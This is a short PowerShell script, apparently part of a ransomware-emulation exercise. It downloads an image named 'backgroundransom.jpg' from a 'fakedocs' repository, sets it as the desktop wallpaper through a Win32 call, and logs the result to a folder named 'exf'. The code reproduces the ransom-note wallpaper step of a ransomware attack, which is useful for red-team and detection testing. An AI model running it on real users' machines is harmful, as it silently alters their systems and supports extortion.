$url = "https://raw.githubusercontent.com/JimBenna/fakedocs/main/backgroundransom.jpg";
$imgLocation = "$env:UserProfile\\AppData\\Local\\wallpaper.jpg";
$Exf_File = "$env:PUBLIC\exf\Download_back.log";

add-type @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
namespace Wallpaper {
 public enum Style: int {
  Tiled,
  Centered,
  Stretched,
  Fit
 }
 public class Setter {
  public
  const int SetDesktopWallpaper = 20;
  public
  const int UpdateIniFile = 0x01;
  public
  const int SendWinIniChange = 0x02;
  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
  private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
  public static void SetWallpaper(string path, Wallpaper.Style style) {
   SystemParametersInfo(SetDesktopWallpaper, 0, path, UpdateIniFile | SendWinIniChange);
  }
 }
}
"@
$wallpaperPath = "$Env:UserProfile\\AppData\\Local\\wallpaper.jpg";
Invoke-WebRequest -Uri "$url" -OutFile "$imgLocation";
try 
{
[Wallpaper.Setter]::SetWallpaper((Convert-Path $wallpaperPath), "Fit");
Write-Output "The User's WallPaper has been replaced by $imgLocation" | Out-File -FilePath "$Exf_File";
}
catch
{
Write-Output "Cannot download $url" | Out-File -FilePath "$Exf_File";
}
